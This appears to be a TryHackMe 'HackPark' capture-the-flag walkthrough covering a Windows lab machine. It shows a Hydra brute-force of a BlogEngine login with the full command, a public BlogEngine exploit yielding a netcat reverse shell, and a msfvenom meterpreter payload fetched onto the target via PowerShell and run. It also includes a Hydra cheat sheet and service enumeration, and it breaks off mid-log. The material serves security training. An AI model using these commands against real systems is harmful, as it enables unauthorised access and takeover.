---
Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/8c8b2105d74035ca43531681439b457e.png)

Connect to our network and deploy this machine. Please be patient as this machine can take up to 5 minutes to boot! You can test if you are connected to our network, by going to our access page. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

```
go to http://10.10.97.210/
then reverse image search  the clown (google extension)
google lens
or

download image and search on google images , or using yandex (but is written in russian)


PennyWise

```

Whats the name of the clown displayed on the homepage?
*PennyWise*

### Using Hydra to brute-force a login 

![](https://i.imgur.com/8wR5oby.png)
Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful Kali Linux machine and control it in your browser!

Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain the password.



We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found [here](https://www.w3schools.com/tags/ref_httpmethods.asp)).

```
got to ip/login

http://10.10.97.210/Account/login.aspx?ReturnURL=%2fadmin%2f

then inspect/network and see what HTTp method is, so enter an username and pass whatever a check is POST

or

┌──(kali㉿kali)-[~/alfred]
└─$ curl -s http://10.10.97.210/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
    <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">


using burpsuite and hydra


POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1

Host: 10.10.97.210

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 760

Origin: http://10.10.97.210

Connection: close

Referer: http://10.10.97.210/Account/login.aspx?ReturnURL=%2fadmin%2f

Upgrade-Insecure-Requests: 1



__VIEWSTATE=savs4w5xqq5WN1BwyyEabVd2wCjIHbtPaIzFXyli0Hro5Z%2BIBinh%2BoGn8tvVKr1%2FTlGup1EuUA0ZBMtp3HRW2S6OkqH7hS2txGcnULjZsHRm7kSndR8xZMFIuyVcDMo3Rk%2FBG7aBZUmPtrYKC5an0BxHd5Uj%2FSghlV6rpjW5wOJA7qA5SmA3l1dZsjf%2FOZC6604p1bA%2BWaCXqojeVCVe56bIgRk%2FpFz17kbJr5M92Xu56xNDqpWcb%2BswOEdSNyTiTqYEpPgNE0RHyFnFeH67KOSNmBXJy2m5QS%2Fsv1jN77dqygGjB%2FsUqdzSg%2FQCCWF9jvPPeqd8yvZr4VJzXsbq5Dqa4Wrw9ebPT8Otp757fPC543EH&__EVENTVALIDATION=WN2%2BrJK%2FRbdWWf5QzfkOh3ZxWugDIs8I71cy1eGi%2BCEHlhHGgGG0F5LyD4fBmlTa3Byi1qHu5QFbMENwxtj6whqxw57RpdgghX3py30FH%2FHPpYN9PvQh1sOrSUZy2tM1kLhEhAFky2Vm27AboCtZZYMph3qP8o0SVvRpaYe%2BD7jDJZsC&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in

so

┌──(kali㉿kali)-[~/alfred]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.97.210 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=savs4w5xqq5WN1BwyyEabVd2wCjIHbtPaIzFXyli0Hro5Z%2BIBinh%2BoGn8tvVKr1%2FTlGup1EuUA0ZBMtp3HRW2S6OkqH7hS2txGcnULjZsHRm7kSndR8xZMFIuyVcDMo3Rk%2FBG7aBZUmPtrYKC5an0BxHd5Uj%2FSghlV6rpjW5wOJA7qA5SmA3l1dZsjf%2FOZC6604p1bA%2BWaCXqojeVCVe56bIgRk%2FpFz17kbJr5M92Xu56xNDqpWcb%2BswOEdSNyTiTqYEpPgNE0RHyFnFeH67KOSNmBXJy2m5QS%2Fsv1jN77dqygGjB%2FsUqdzSg%2FQCCWF9jvPPeqd8yvZr4VJzXsbq5Dqa4Wrw9ebPT8Otp757fPC543EH&__EVENTVALIDATION=WN2%2BrJK%2FRbdWWf5QzfkOh3ZxWugDIs8I71cy1eGi%2BCEHlhHGgGG0F5LyD4fBmlTa3Byi1qHu5QFbMENwxtj6whqxw57RpdgghX3py30FH%2FHPpYN9PvQh1sOrSUZy2tM1kLhEhAFky2Vm27AboCtZZYMph3qP8o0SVvRpaYe%2BD7jDJZsC&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-27 13:32:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.97.210:80/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=savs4w5xqq5WN1BwyyEabVd2wCjIHbtPaIzFXyli0Hro5Z%2BIBinh%2BoGn8tvVKr1%2FTlGup1EuUA0ZBMtp3HRW2S6OkqH7hS2txGcnULjZsHRm7kSndR8xZMFIuyVcDMo3Rk%2FBG7aBZUmPtrYKC5an0BxHd5Uj%2FSghlV6rpjW5wOJA7qA5SmA3l1dZsjf%2FOZC6604p1bA%2BWaCXqojeVCVe56bIgRk%2FpFz17kbJr5M92Xu56xNDqpWcb%2BswOEdSNyTiTqYEpPgNE0RHyFnFeH67KOSNmBXJy2m5QS%2Fsv1jN77dqygGjB%2FsUqdzSg%2FQCCWF9jvPPeqd8yvZr4VJzXsbq5Dqa4Wrw9ebPT8Otp757fPC543EH&__EVENTVALIDATION=WN2%2BrJK%2FRbdWWf5QzfkOh3ZxWugDIs8I71cy1eGi%2BCEHlhHGgGG0F5LyD4fBmlTa3Byi1qHu5QFbMENwxtj6whqxw57RpdgghX3py30FH%2FHPpYN9PvQh1sOrSUZy2tM1kLhEhAFky2Vm27AboCtZZYMph3qP8o0SVvRpaYe%2BD7jDJZsC&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[STATUS] 936.00 tries/min, 936 tries in 00:01h, 14343463 to do in 255:25h, 16 active
[80][http-post-form] host: 10.10.97.210   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-27 13:34:16

admin:1qaz2wsx


Let's break down the parameters that we have passed to hydra.

    -l → login/username

2.    -P  → Password list

3.   Http-post-form → request data form that is sent to the web server via the browser.



Replace the Username and Password field with “^USER^” & “^PASS^” respectively in the web form request, as hydra will be targeting these parameters for the brute force.

You might have noticed that we added an additional parameter of “Login Failed” at the end of the post form data. This is an error we observed after someone enters wrong credentials.



```

![[Pasted image 20220927121222.png]]


![[Pasted image 20220927123705.png]]

What request type is the Windows website login form using?

*POST*


Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.

![[Pasted image 20220927122543.png]]

Run the following command but fill in the blanks:

	hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form

Guess a username, choose a password wordlist and gain credentials to a user account!
Username is admin... But what is the password?

*1qaz2wsx*


Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the http-post-form that we used above).

However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more. 

Below is a mini cheatsheet:

	Command	Description
	hydra -P <wordlist> -v <ip> <protocol>
	Brute force against a protocol of your choice
	hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
	You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
	hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
	Attack a Windows Remote Desktop with a password list.
	hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
	Craft a more specific request for Hydra to brute force.


### Compromise the machine 

![](https://i.imgur.com/FhJQrqE.png)

In this task, you will identify and execute a public exploit (from exploit-db.com) to get initial access on this Windows machine!

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)

```
log in 

then click about


Your BlogEngine.NET Specification

    Version: 3.3.6.0
    Configuration: Single blog
    Trust level: Unrestricted
    Identity: IIS APPPOOL\Blog
    Blog provider: XmlBlogProvider
    Membership provider: XmlMembershipProvider
    Role provider: XmlRoleProvider

vulnerability blogengine 3.3.6.0 (googling)

https://www.exploit-db.com/exploits/46353


Let’s follow the instructions:

    Start by modifying the script so that we report the correct value for IP and port.
    Rename your script as PostView.ascx
    Go to posts (http://10.10.79.198/admin/#/content/posts) and click on “Welcome to HackPark” to edit this post
    From the edit bar on top of the post, click on the “File Manager” icon
    Click on the “+ UPLOAD” button and upload the PostView.ascx script
    Close the file manager and click on “Save”
    Now, open your listener (rlwrap nc -nlvp 1234)
    Go to http://10.10.79.198/?theme=../../App_Data/files

Check your listener, you should now have a reverse shell. 


┌──(kali㉿kali)-[~/Downloads]
└─$ nano 46353.cs 
                                                                                                                 
┌──(kali㉿kali)-[~/Downloads]
└─$ mv 46353.cs PostView.ascx

upload this follow instructions before

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -nlvp 4445 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 10.10.97.210.
Ncat: Connection from 10.10.97.210:49285.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.



```



Now you have logged into the website, are you able to identify the version of the BlogEngine?
*3.3.6.0*

Use the exploit database archive to find an exploit to gain a reverse shell on this system.

What is the CVE?
Look on the exploit database page. Answer is in the format: CVE-YEAR-NUMBER

*CVE-2019-6714 *

![[Pasted image 20220927125117.png]]

Using the public exploit, gain initial access to the server.

	Who is the webserver running as?
	iis apppool\blog

### Windows Privilege Escalation 

![|333](https://i.imgur.com/IA4n6AV.png)

In this task we will learn about the basics of Windows Privilege Escalation.

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.



Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom.

If you don't know how to do this, I suggest completing the Metasploit room first!

![](https://i.imgur.com/lXRXJ5a.png)

Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!


```
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir hackpark           
                                                                                                                 
┌──(kali㉿kali)-[~/Downloads]
└─$ cd hackpark 
                                                                                                                 
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.220 LPORT=2345 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: revshell.exe
                                                                                                                 
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.97.210 - - [27/Sep/2022 13:58:59] "GET /revshell.exe HTTP/1.1" 200 -

passing shell

powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
c:\windows\system32\inetsrv>powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
cd c:\windows\temp
c:\windows\system32\inetsrv>cd c:\windows\temp
dir
c:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Windows\Temp
09/27/2022  10:59 AM    <DIR>          .
09/27/2022  10:59 AM    <DIR>          ..
08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
08/06/2019  02:13 PM             1,206 cleanup.txt
08/06/2019  02:13 PM               421 cmdout
08/06/2019  02:11 PM                 0 DMI2EBC.tmp
08/03/2019  10:43 AM                 0 DMI4D21.tmp
08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log
08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
09/27/2022  10:59 AM            73,802 revshell.exe
08/06/2019  02:13 PM                21 stage1-complete.txt
08/06/2019  02:13 PM            28,495 stage1.txt
05/12/2019  09:03 PM           113,328 svcexec.exe
08/06/2019  02:13 PM                67 tmp.dat
              13 File(s)        708,784 bytes
               2 Dir(s)  39,125,929,984 bytes free
.\revshell.exe
c:\Windows\Temp>.\revshell.exe


┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
msf6 exploit(multi/handler) > set LPORT 2345
LPORT => 2345
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.81.220:2345 


.\revshell.exe
c:\Windows\Temp>.\revshell.exe


┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
msf6 exploit(multi/handler) > set LPORT 2345
LPORT => 2345
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.81.220:2345 
[*] Sending stage (175686 bytes) to 10.10.97.210
[*] Meterpreter session 1 opened (10.11.81.220:2345 -> 10.10.97.210:49295) at 2022-09-27 14:01:11 -0400

meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows


```

You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.

What is the OS version of this windows machine?
*Windows 2012 R2 (6.3 Build 9600)*

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User              Path
 ---   ----  ----                  ----  -------  ----              ----
 0     0     [System Process]
 4     0     System
 372   4     smss.exe
 480   2444  Message.exe
 484   2060  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 524   516   csrss.exe
 580   568   csrss.exe
 588   516   wininit.exe
 616   568   winlogon.exe
 676   588   services.exe
 684   588   lsass.exe
 740   676   svchost.exe
 784   676   svchost.exe
 860   616   dwm.exe
 872   676   svchost.exe
 900   676   svchost.exe
 960   676   svchost.exe
 976   676   svchost.exe
 1016  676   svchost.exe
 1032  676   msdtc.exe
 1104  484   conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 1136  676   spoolsv.exe
 1164  676   amazon-ssm-agent.exe
 1244  676   svchost.exe
 1264  676   LiteAgent.exe
 1296  676   svchost.exe
 1364  676   svchost.exe
 1380  676   svchost.exe
 1412  676   WService.exe
 1552  1412  WScheduler.exe
 1656  676   Ec2Config.exe
 1748  740   WmiPrvSE.exe
 2060  1380  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
 2444  2036  WScheduler.exe
 2536  900   taskhostex.exe
 2548  484   revshell.exe          x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\revshell.exe
 2612  2604  explorer.exe
 3064  2576  ServerManager.exe

```

Further enumerate the machine.

	What is the name of the abnormal service running?
	Check in the "C:\Program Files (x86)" directory and go from there. Remember, you can use meterpreter to check all running processes on the machine.

*WindowsScheduler*

```
meterpreter > cd "c:\program files (x86)"
meterpreter > ls
Listing: c:\program files (x86)
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Common Files
040777/rwxrwxrwx  4096  dir   2014-03-21 15:07:01 -0400  Internet Explorer
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Microsoft.NET
040777/rwxrwxrwx  8192  dir   2019-08-04 07:37:02 -0400  SystemScheduler
040777/rwxrwxrwx  0     dir   2019-08-06 17:12:04 -0400  Uninstall Information
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:33 -0400  Windows Mail
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Windows NT
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  WindowsPowerShell
100666/rw-rw-rw-  174   fil   2013-08-22 11:37:57 -0400  desktop.ini

meterpreter > cd SystemScheduler
meterpreter > ls
Listing: c:\program files (x86)\SystemScheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2022-09-27 14:07:34 -0400  Events
100666/rw-rw-rw-  60       fil   2019-08-04 07:36:42 -0400  Forum.url
100666/rw-rw-rw-  9813     fil   2004-11-16 02:16:34 -0500  License.txt
100666/rw-rw-rw-  1496     fil   2022-09-27 12:48:33 -0400  LogFile.txt
100666/rw-rw-rw-  3760     fil   2022-09-27 12:49:02 -0400  LogfileAdvanced.txt
100777/rwxrwxrwx  536992   fil   2018-03-25 13:58:56 -0400  Message.exe
100777/rwxrwxrwx  445344   fil   2018-03-25 13:59:00 -0400  PlaySound.exe
100777/rwxrwxrwx  27040    fil   2018-03-25 13:58:58 -0400  PlayWAV.exe
100666/rw-rw-rw-  149      fil   2019-08-04 18:05:19 -0400  Preferences.ini
100777/rwxrwxrwx  485792   fil   2018-03-25 13:58:58 -0400  Privilege.exe
100666/rw-rw-rw-  10100    fil   2018-03-24 15:09:04 -0400  ReadMe.txt
100777/rwxrwxrwx  112544   fil   2018-03-25 13:58:58 -0400  RunNow.exe
100777/rwxrwxrwx  235936   fil   2018-03-25 13:58:56 -0400  SSAdmin.exe
100777/rwxrwxrwx  731552   fil   2018-03-25 13:58:56 -0400  SSCmd.exe
100777/rwxrwxrwx  456608   fil   2018-03-25 13:58:58 -0400  SSMail.exe
100777/rwxrwxrwx  1633696  fil   2018-03-25 13:58:52 -0400  Scheduler.exe
100777/rwxrwxrwx  491936   fil   2018-03-25 13:59:00 -0400  SendKeysHelper.exe
100777/rwxrwxrwx  437664   fil   2018-03-25 13:58:56 -0400  ShowXY.exe
100777/rwxrwxrwx  439712   fil   2018-03-25 13:58:56 -0400  ShutdownGUI.exe
100666/rw-rw-rw-  785042   fil   2006-05-16 19:49:52 -0400  WSCHEDULER.CHM
100666/rw-rw-rw-  703081   fil   2006-05-16 19:58:18 -0400  WSCHEDULER.HLP
100777/rwxrwxrwx  136096   fil   2018-03-25 13:58:58 -0400  WSCtrl.exe
100777/rwxrwxrwx  68512    fil   2018-03-25 13:58:54 -0400  WSLogon.exe
100666/rw-rw-rw-  33184    fil   2018-03-25 13:59:00 -0400  WSProc.dll
100666/rw-rw-rw-  2026     fil   2006-05-16 18:58:18 -0400  WScheduler.cnt
100777/rwxrwxrwx  331168   fil   2018-03-25 13:58:52 -0400  WScheduler.exe
100777/rwxrwxrwx  98720    fil   2018-03-25 13:58:54 -0400  WService.exe
100666/rw-rw-rw-  54       fil   2019-08-04 07:36:42 -0400  Website.url
100777/rwxrwxrwx  76704    fil   2018-03-25 13:58:58 -0400  WhoAmI.exe
100666/rw-rw-rw-  1150     fil   2007-05-17 16:47:02 -0400  alarmclock.ico
100666/rw-rw-rw-  766      fil   2003-08-31 15:06:08 -0400  clock.ico
100666/rw-rw-rw-  80856    fil   2003-08-31 15:06:10 -0400  ding.wav
100666/rw-rw-rw-  1637972  fil   2009-01-08 22:21:48 -0500  libeay32.dll
100777/rwxrwxrwx  40352    fil   2018-03-25 13:59:00 -0400  sc32.exe
100666/rw-rw-rw-  766      fil   2003-08-31 15:06:26 -0400  schedule.ico
100666/rw-rw-rw-  355446   fil   2009-01-08 22:12:34 -0500  ssleay32.dll
100666/rw-rw-rw-  6999     fil   2019-08-04 07:36:42 -0400  unins000.dat
100777/rwxrwxrwx  722597   fil   2019-08-04 07:36:32 -0400  unins000.exe
100666/rw-rw-rw-  6574     fil   2009-06-26 20:27:32 -0400  whiteclock.ico

meterpreter > cd Events
meterpreter > ls
Listing: c:\program files (x86)\SystemScheduler\Events
======================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1926   fil   2022-09-27 14:08:01 -0400  20198415519.INI
100666/rw-rw-rw-  28489  fil   2022-09-27 14:08:01 -0400  20198415519.INI_LOG.txt
100666/rw-rw-rw-  290    fil   2020-10-02 17:50:12 -0400  2020102145012.INI
100666/rw-rw-rw-  186    fil   2022-09-27 14:01:16 -0400  Administrator.flg
100666/rw-rw-rw-  182    fil   2022-09-27 14:01:13 -0400  SYSTEM_svc.flg
100666/rw-rw-rw-  0      fil   2022-09-27 12:49:02 -0400  Scheduler.flg
100666/rw-rw-rw-  449    fil   2022-09-27 14:01:16 -0400  SessionInfo.flg
100666/rw-rw-rw-  0      fil   2022-09-27 14:01:28 -0400  service.flg

meterpreter > cat 20198415519.INI_LOG.txt 
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
08/04/19 15:09:00,Event Started Ok, (Administrator)
08/04/19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
08/04/19 15:10:00,Event Started Ok, (Administrator)
08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
08/04/19 15:11:00,Event Started Ok, (Administrator)
08/04/19 15:11:33,Process Ended. PID:468,ExitCode:4,Message.exe (Administrator)
08/04/19 15:12:00,Event Started Ok, (Administrator)
08/04/19 15:12:33,Process Ended. PID:2244,ExitCode:4,Message.exe (Administrator)
08/04/19 15:13:00,Event Started Ok, (Administrator)
08/04/19 15:13:33,Process Ended. PID:1700,ExitCode:4,Message.exe (Administrator)
08/04/19 16:43:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
08/04/19 16:44:01,Event Started Ok, (Administrator)
08/04/19 16:44:05,Process Ended. PID:2228,ExitCode:1,Message.exe (Administrator)
08/04/19 16:45:00,Event Started Ok, (Administrator)
08/04/19 16:45:20,Process Ended. PID:2640,ExitCode:1,Message.exe (Administrator)
08/04/19 16:46:00,Event Started Ok, (Administrator)
08/04/19 16:46:03,Process Ended. PID:2912,ExitCode:1,Message.exe (Administrator)
08/04/19 16:47:00,Event Started Ok, (Administrator)
08/04/19 16:47:24,Process Ended. PID:1944,ExitCode:1,Message.exe (Administrator)
08/04/19 16:48:01,Event Started Ok, (Administrator)
08/04/19 16:48:18,Process Ended. PID:712,ExitCode:1,Message.exe (Administrator)
08/04/19 16:49:00,Event Started Ok, (Administrator)
08/04/19 16:49:23,Process Ended. PID:1936,ExitCode:1,Message.exe (Administrator)
08/04/19 18:00:01,Event Started Ok, (Administrator)
08/04/19 18:00:09,Process Ended. PID:2536,ExitCode:1,Message.exe (Administrator)
08/04/19 18:01:00,Event Started Ok, (Administrator)
08/04/19 18:01:03,Process Ended. PID:2140,ExitCode:1,Message.exe (Administrator)
08/04/19 18:02:01,Event Started Ok, (Administrator)
08/04/19 18:02:03,Process Ended. PID:2652,ExitCode:1,Message.exe (Administrator)
08/04/19 18:03:00,Event Started Ok, (Administrator)
08/04/19 18:03:03,Process Ended. PID:1584,ExitCode:1,Message.exe (Administrator)
08/04/19 18:04:00,Event Started Ok, (Administrator)
08/04/19 18:04:03,Process Ended. PID:2588,ExitCode:1,Message.exe (Administrator)
08/04/19 18:05:01,Event Started Ok, (Administrator)
08/05/19 13:27:01,Event Started Ok, (Administrator)
08/05/19 13:27:01,Process Ended. PID:2836,ExitCode:1,Message.exe (Administrator)
08/05/19 13:28:00,Event Started Ok, (Administrator)
08/05/19 13:28:18,Process Ended. PID:2212,ExitCode:1,Message.exe (Administrator)
08/05/19 13:29:00,Event Started Ok, (Administrator)
08/05/19 13:29:33,Process Ended. PID:2660,ExitCode:4,Message.exe (Administrator)
08/05/19 13:30:01,Event Started Ok, (Administrator)
08/05/19 13:30:34,Process Ended. PID:1996,ExitCode:4,Message.exe (Administrator)
08/05/19 13:31:00,Event Started Ok, (Administrator)
08/05/19 13:31:33,Process Ended. PID:2084,ExitCode:4,Message.exe (Administrator)
08/05/19 13:32:00,Event Started Ok, (Administrator)
08/05/19 13:32:33,Process Ended. PID:1392,ExitCode:4,Message.exe (Administrator)
08/05/19 13:33:00,Event Started Ok, (Administrator)
08/05/19 13:33:33,Process Ended. PID:1208,ExitCode:4,Message.exe (Administrator)
08/05/19 13:34:00,Event Started Ok, (Administrator)
08/05/19 13:34:33,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)
08/05/19 13:35:00,Event Started Ok, (Administrator)
08/05/19 13:35:33,Process Ended. PID:1808,ExitCode:4,Message.exe (Administrator)
08/05/19 13:36:00,Event Started Ok, (Administrator)
08/05/19 13:36:33,Process Ended. PID:2428,ExitCode:4,Message.exe (Administrator)
08/05/19 13:37:00,Event Started Ok, (Administrator)
08/05/19 13:37:34,Process Ended. PID:2456,ExitCode:4,Message.exe (Administrator)
08/05/19 13:38:00,Event Started Ok, (Administrator)
08/05/19 13:38:33,Process Ended. PID:2344,ExitCode:4,Message.exe (Administrator)
08/05/19 13:39:00,Event Started Ok, (Administrator)
08/05/19 13:39:34,Process Ended. PID:1396,ExitCode:4,Message.exe (Administrator)
08/05/19 13:40:00,Event Started Ok, (Administrator)
08/05/19 13:40:33,Process Ended. PID:1748,ExitCode:4,Message.exe (Administrator)
08/05/19 13:41:00,Event Started Ok, (Administrator)
08/05/19 13:41:33,Process Ended. PID:2212,ExitCode:4,Message.exe (Administrator)
08/05/19 13:42:00,Event Started Ok, (Administrator)
08/05/19 13:42:32,Process Ended. PID:2800,ExitCode:4,Message.exe (Administrator)
08/05/19 13:43:00,Event Started Ok, (Administrator)
08/05/19 13:43:33,Process Ended. PID:580,ExitCode:4,Message.exe (Administrator)
08/05/19 14:04:01,Event Started Ok, (Administrator)
08/05/19 14:04:33,Process Ended. PID:732,ExitCode:4,Message.exe (Administrator)
08/05/19 14:05:00,Event Started Ok, (Administrator)
08/05/19 14:05:34,Process Ended. PID:1584,ExitCode:4,Message.exe (Administrator)
08/05/19 14:06:00,Event Started Ok, (Administrator)
08/05/19 14:06:33,Process Ended. PID:1980,ExitCode:4,Message.exe (Administrator)
08/05/19 14:07:00,Event Started Ok, (Administrator)
08/05/19 14:07:33,Process Ended. PID:1236,ExitCode:4,Message.exe (Administrator)
08/05/19 14:08:00,Event Started Ok, (Administrator)
08/05/19 14:08:33,Process Ended. PID:1892,ExitCode:4,Message.exe (Administrator)
08/05/19 14:09:00,Event Started Ok, (Administrator)
08/05/19 14:09:33,Process Ended. PID:1852,ExitCode:4,Message.exe (Administrator)
08/05/19 14:10:00,Event Started Ok, (Administrator)
08/05/19 14:10:33,Process Ended. PID:972,ExitCode:4,Message.exe (Administrator)
08/05/19 14:11:00,Event Started Ok, (Administrator)
08/05/19 14:11:34,Process Ended. PID:1684,ExitCode:4,Message.exe (Administrator)
08/05/19 14:12:00,Event Started Ok, (Administrator)
08/05/19 14:12:33,Process Ended. PID:96,ExitCode:4,Message.exe (Administrator)
08/05/19 14:13:00,Event Started Ok, (Administrator)
08/05/19 14:13:34,Process Ended. PID:1620,ExitCode:4,Message.exe (Administrator)
08/05/19 14:15:00,Event Started Ok, (Administrator)
08/05/19 14:15:33,Process Ended. PID:800,ExitCode:4,Message.exe (Administrator)
08/05/19 14:16:00,Event Started Ok, (Administrator)
08/05/19 14:16:33,Process Ended. PID:1940,ExitCode:4,Message.exe (Administrator)
08/05/19 14:17:00,Event Started Ok, (Administrator)
08/05/19 14:17:33,Process Ended. PID:1656,ExitCode:4,Message.exe (Administrator)
08/05/19 14:18:00,Event Started Ok, (Administrator)
